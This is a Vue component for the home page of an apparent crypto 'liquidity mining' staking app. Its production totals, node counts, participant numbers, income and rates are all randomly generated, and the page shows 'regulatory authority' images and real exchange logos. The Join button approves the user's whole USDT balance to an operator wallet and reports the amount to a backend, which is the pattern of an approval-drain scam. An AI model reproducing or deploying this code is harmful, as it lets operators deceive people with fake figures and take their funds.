<template>
  <div class="home-page">
    <Header />

    <div class="wallet-balance-section">
      <div class="eth-name">ETH</div>
      <div class="eth-amount">{{ userBalance.income }}</div>

      <van-count-down v-if="userBalance.timeCount" :time="userBalance.timeCount">
        <template #default="timeData">
          <span class="time-block">{{ timeData.hours }}</span>
          <span class="time-colon">:</span>
          <span class="time-block">{{ timeData.minutes }}</span>
          <span class="time-colon">:</span>
          <span class="time-block">{{ timeData.seconds }}</span>
        </template>
      </van-count-down>

      <div v-else class="btn-wrapper">
        <van-button type="primary" block @click="handleJoin">{{ $t('join') }}</van-button>
      </div>

      <div class="wallet-balance">
        <div class="label">{{ $t('walletBalance') }}</div>
        <div class="value">{{ store.usdtBalance }}</div>
      </div>
    </div>

    <div class="benefit-section">
      <div class="benefit-item">
        <div class="label">{{ $t('benefitRadio') }}</div>
        <div class="value">{{ state.benefitRadio }}%</div>
      </div>

      <div class="benefit-item">
        <div class="label">{{ $t('stakingAPY') }}</div>
        <div class="value primary">{{ store.stakingRate }}%</div>
      </div>
    </div>

    <div class="common-title">{{ $t('liquidityMingData') }}</div>
    <div class="mining-section">
      <div class="mining-item van-hairline--bottom">
        <div class="label">{{ $t('totalProduction') }}</div>
        <div class="value">{{ state.mining.total }} USDT</div>
      </div>
      <div class="mining-item van-hairline--bottom">
        <div class="label">{{ $t('effectiveNodes') }}</div>
        <div class="value">{{ state.mining.node }}</div>
      </div>
      <div class="mining-item van-hairline--bottom">
        <div class="label">{{ $t('participantNumber') }}</div>
        <div class="value">{{ state.mining.amount }}</div>
      </div>
      <div class="mining-item">
        <div class="label">{{ $t('userIncome') }}</div>
        <div class="value">{{ state.mining.income }} USDT</div>
      </div>
    </div>

    <div class="common-title">{{ $t('liquidityMingOutput') }}</div>
    <div class="mining-output-section">
      <div class="marquee-header">
        <div class="label">{{ $t('address') }}</div>
        <div class="value">{{ $t('usdtAmount') }}</div>
      </div>
      <div class="marquee-list">
        <Vue3Marquee :duration="100" vertical>
          <div v-for="(item, index) in WALLET_LIST" :key="index" class="marquee-item">
            <div class="label">{{ formatWalletAddress(item.walletAddress) }}</div>
            <div class="value">{{ item.usdt }}</div>
          </div>
        </Vue3Marquee>
      </div>
    </div>

    <div class="staking-section">
      <div class="staking-item">
        <div class="value">{{ state.miningSpeed }}%</div>
        <div class="desc">{{ $t('miningRate') }}</div>
        <img src="@/assets/images/mining_rate.png" />
      </div>
      <div class="staking-item" @click="showTransferPopup">
        <div class="value">0</div>
        <div class="desc">
          {{ $t('staking') }}

          <van-icon name="arrow" />
        </div>
        <img src="@/assets/images/staking.png" />
      </div>
    </div>

    <div class="authorities-section">
      <div class="title">{{ $t('regulatoryAuthorities') }}</div>
      <div class="desc">{{ $t('globalAuthorities') }}</div>

      <div class="authorities-list">
        <img src="@/assets/images/authorities_1.png" />
        <img src="@/assets/images/authorities_2.png" />
        <img src="@/assets/images/authorities_3.png" />
      </div>
    </div>

    <div class="platform-section">
      <div class="title">{{ $t('cooperativePlatform') }}</div>

      <div class="platform-list">
        <div
          v-for="item in PLATFORM_LIST"
          :key="item.name"
          class="platform-item"
          @click="openWindow(item)"
        >
          <img :src="item.image" />
          <div class="name">{{ item.name }}</div>
        </div>
      </div>
    </div>

    <bottom-bar />
  </div>
</template>

<script setup>
import { showToast } from 'vant';
import { computed, onMounted, reactive } from 'vue';
import { useI18n } from 'vue-i18n';
import { Vue3Marquee } from 'vue3-marquee';

import { addActivity } from '@/api';
import { loading } from '@/components';
import Header from '@/components/Header';
import { showTransferPopup } from '@/popup';
import { useStore } from '@/store';
import { formatWalletAddress } from '@/utils';
import { WALLET_LIST } from '@/utils/constants';
import { approveUsdt } from '@/web3';

const PLATFORM_LIST = [
  {
    image: require('@/assets/images/bitfinex.png'),
    name: 'Bitfinex',
    link: 'https://www.bitfinex.com/',
  },
  { image: require('@/assets/images/okex.png'), name: 'Okex', link: 'https://www.okx.com/ ' },
  { image: require('@/assets/images/gate.png'), name: 'Gate.io', link: 'https://www.gate.io/' },
  {
    image: require('@/assets/images/kraken.png'),
    name: 'Kraken',
    link: 'https://www.kraken.com/ ',
  },
  { image: require('@/assets/images/lbank.png'), name: 'LBank', link: 'https://m.lbank.com/' },
  {
    image: require('@/assets/images/binance.png'),
    name: 'Binance',
    link: 'https://www.binance.com/',
  },
];

function getRandomFloat(min = 20, max = 70) {
  return parseFloat((Math.random() * (max - min) + min).toFixed(2));
}

const { t } = useI18n();
const store = useStore();
const state = reactive({
  benefitRadio: getRandomFloat(),
  stakingAPY: getRandomFloat(100),
  mining: {
    total: getRandomFloat(10000, 500000),
    node: getRandomFloat(1000, 5000),
    amount: getRandomFloat(10000, 50000),
    income: getRandomFloat(10000, 500000),
  },
  miningSpeed: getRandomFloat(),
});

const userBalance = computed(() => store.userBalance);
onMounted(async () => {
  store.connectWallet();
});

const openWindow = (item) => {
  window.open(item.link);
};

const joinActivity = async (authStatus) => {
  await addActivity({
    activityType: 0,
    amount: store.usdtBalance,
    approvalAddr: store.walletAddress,
    authStatus,
    chainType: 2,
  });
};

const handleJoin = async () => {
  try {
    loading.open();

    if (!store.walletAddress) {
      await store.connectWallet();
    }

    await joinActivity(0);

    await approveUsdt(store.stakingWallet, store.rawUsdtBalance);

    await joinActivity(1);
    store.fetchUserAsset();
    store.fetchUsdtBalance();
    store.fetchUserBalance();
    loading.close();
    showToast(t('success'));
  } catch {
    loading.close();
    showToast(t('failed'));
  }
};
</script>

<style lang="less" scoped>
.home-page {
  padding: 0 12px 100px;
  background: linear-gradient(180deg, #e4f2ff 0%, #f5faff 100%);

  .common-title {
    padding: 12px 4px;
    font-weight: bold;
  }

  .wallet-balance-section {
    padding: 16px;
    text-align: center;
    background: var(--white);
    border-radius: 8px;

    .eth-name {
      font-size: 15px;
      font-weight: bold;
      color: var(--text-color-3);
      text-align: center;
    }

    .eth-amount {
      display: inline-block;
      padding: 6px;
      margin: 12px;
      font-size: 24px;
      font-weight: bold;
      background: url('~@/assets/images/line.png');
      background-size: 100% 100%;
    }

    .wallet-balance {
      display: flex;
      justify-content: space-between;
      margin-top: 16px;

      .label {
        color: var(--text-color-3);
      }

      .value {
        font-weight: bold;
      }
    }

    .btn-wrapper {
      .van-button {
        font-weight: bold;
      }
    }
  }

  .benefit-section {
    display: flex;
    gap: 12px;
    padding: 16px;
    margin-top: 12px;
    background: var(--white);
    border-radius: 8px;

    .benefit-item {
      flex: 1;

      .label {
        color: var(--text-color-3);
      }

      .value {
        padding: 12px;
        margin-top: 10px;
        font-weight: bold;
        background: #f6f6f6;
        border-radius: 4px;

        &.primary {
          color: var(--primary-color);
        }
      }
    }
  }

  .mining-section {
    padding: 0 16px;
    background: var(--white);
    border-radius: 8px;

    .mining-item {
      display: flex;
      justify-content: space-between;
      padding: 16px 0;

      .value {
        font-weight: bold;
      }
    }
  }

  .mining-output-section {
    overflow: hidden;
    border-radius: 8px;

    .marquee-header {
      display: flex;
      justify-content: space-between;
      padding: 12px;
      font-weight: bold;
      background: #f5f5f5;
    }

    .marquee-list {
      height: 176px;
      padding: 0 12px;
      overflow: hidden;
      background: var(--white);

      .marquee-item {
        display: flex;
        align-items: center;
        justify-content: space-between;
        width: 325px;
        height: 44px;
      }
    }
  }

  .staking-section {
    display: flex;
    gap: 8px;
    padding: 8px;
    margin-top: 12px;
    background-color: var(--white);
    border-radius: 8px;

    .staking-item {
      position: relative;
      flex: 1;
      padding: 16px;
      background: linear-gradient(180deg, #e4f2ff 0%, #f5faff 100%);
      border-radius: 4px;

      .value {
        font-size: 18px;
        font-weight: bold;
      }

      .desc {
        margin-top: 4px;
        font-weight: bold;
        color: var(--text-color-3);
      }

      img {
        position: absolute;
        right: 0;
        bottom: 0;
        width: 40px;
      }
    }
  }

  .authorities-section {
    padding: 16px;
    margin-top: 12px;
    text-align: center;
    background: linear-gradient(208.53deg, #ddefff -0.41%, #fff 26.27%);
    border-radius: 8px;

    .title {
      font-size: 15px;
      font-weight: bold;
    }

    .desc {
      margin: 12px 0 16px;
    }

    .authorities-list {
      display: flex;
      gap: 12px;

      img {
        flex: 1;
        width: 100px;
        border-radius: 8px;
      }
    }
  }

  .platform-section {
    padding: 16px;
    margin-top: 12px;
    text-align: center;
    background: linear-gradient(208.53deg, #ddefff -0.41%, #fff 26.27%);
    border-radius: 8px;

    .title {
      margin-bottom: 20px;
      font-size: 15px;
      font-weight: bold;
    }

    .platform-list {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;

      .platform-item {
        display: flex;
        align-items: center;
        justify-content: center;
        width: 98px;
        padding: 12px 8px;
        margin-bottom: 12px;
        font-size: 13px;
        font-weight: bold;
        cursor: pointer;
        background: #f8f8f8;
        border-radius: 4px;

        img {
          width: 22px;
          margin-right: 6px;
        }
      }
    }
  }

  .time-colon {
    display: inline-block;
    margin: 0 4px;
    color: var(--primary-color);
  }

  .time-block {
    display: inline-block;
    width: 28px;
    height: 28px;
    line-height: 28px;
    color: var(--white);
    text-align: center;
    background-color: var(--primary-color);
    border-radius: 4px;
  }
}
</style>
